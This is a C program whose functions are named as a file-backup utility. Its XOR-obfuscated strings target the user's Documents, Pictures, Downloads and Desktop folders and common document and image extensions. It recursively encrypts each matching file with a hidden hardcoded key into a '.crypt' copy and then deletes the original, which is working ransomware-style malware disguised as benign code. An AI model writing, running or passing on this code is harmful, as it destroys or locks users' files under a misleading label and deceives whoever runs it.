#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <errno.h>
#include <sys/stat.h>

const char *possiblePaths[] = {
    "Enbtldour",
    "Qhbutsdr",
    "Envomn`er",
    "Edrjunq"
};

const char *extensions[] = {
    "l&-!",
    "l6:6",
    "l2,%",
    "l(2%",
    "l(2'%"
};

char *decryptXOR(const char *str1, const char str2) {
    size_t str1Len = strlen(str1);
    char *destinationKey = (char *)malloc((str1Len + 1) * sizeof(char));
    strncpy(destinationKey, str1, str1Len);
    destinationKey[str1Len] = '\0';

    for (int i = 0; i < str1Len; i++) {
        destinationKey[i] ^= str2;
    }

    return destinationKey;
}

void backupFile(const char *path) {
    FILE *file = fopen(path, "rb");
    if (file == NULL) {
        perror("fopen");
        exit(EXIT_FAILURE);
    }

    char *filename = malloc(strlen(path) + strlen(".crypt") + 1);
    sprintf(filename, "%s.crypt", path);

    FILE *backupFile = fopen(filename, "wb");
    if (backupFile == NULL) {
        perror("fopen");
        free(filename);
        exit(EXIT_FAILURE);
    }

    char *key = decryptXOR("n2emctYp2ojjghrYto5hYb7kviuu7djc\x06", 6);
    int i = 0;
    while (1) {
        char buffer;
        if (fread(&buffer, sizeof(char), 1, file) == 0) {
            break;
        }

        putc(buffer ^ key[i], backupFile);
        i = (i + 1) % strlen(key);
    }

    free(key);
    free(filename);
    fclose(backupFile);
    fclose(file);

    if (remove(path) != 0) {
        perror("remove");
        exit(EXIT_FAILURE);
    }
}

void backupDirectory(const char *path) {
    DIR *dir;
    struct dirent *entry;

    dir = opendir(path);
    if (dir == NULL) {
        perror("opendir");
        exit(EXIT_FAILURE);
    }

    while ((entry = readdir(dir)) != NULL) {
        char *filename = entry->d_name;
        printf("Filename: %s\n", filename); // Debug statement
        if (strcmp(filename, ".") == 0 || strcmp(filename, "..") == 0) {
            continue;
        }

        char *filenamePath = (char *)malloc(strlen(path) + strlen(filename) + 3);
        sprintf(filenamePath, "%s\\%s", path, filename);
        char *ext = strrchr(filename, '.');

        struct stat st;
        if (stat(filenamePath, &st) == 0 && S_ISDIR(st.st_mode)) {
            backupDirectory(filenamePath);
        } else {
            for (int i = 0; i < 5; i++) {
                char *possibleExtension = decryptXOR(extensions[i], 0x42);
                printf("Extension: %s\n", ext); // Debug statement
                printf("Possible extension: %s\n", possibleExtension); // Debug statement

                if (strcmp(ext, possibleExtension) == 0) {
                    printf("Backing up file: %s\n", filenamePath); // Debug statement
                    backupFile(filenamePath);
                }
                free(possibleExtension);
            }
            free(filenamePath);
        }
    }

    closedir(dir);
    free((void*)path);
}

int main() {
    char *homePath = getenv("HOMEPATH");
    for (int i = 0; i < 4; i++) {
        char *possiblePath = decryptXOR(possiblePaths[i], 1);
        char *pathDirectory = (char *)malloc(strlen(homePath) + strlen(possiblePath) + 3);
        sprintf(pathDirectory, "%s\\%s", homePath, possiblePath);
        free(possiblePath);
        printf("Backing up directory: %s\n", pathDirectory); // Debug statement
        backupDirectory(pathDirectory);
    }

    exit(EXIT_SUCCESS);
}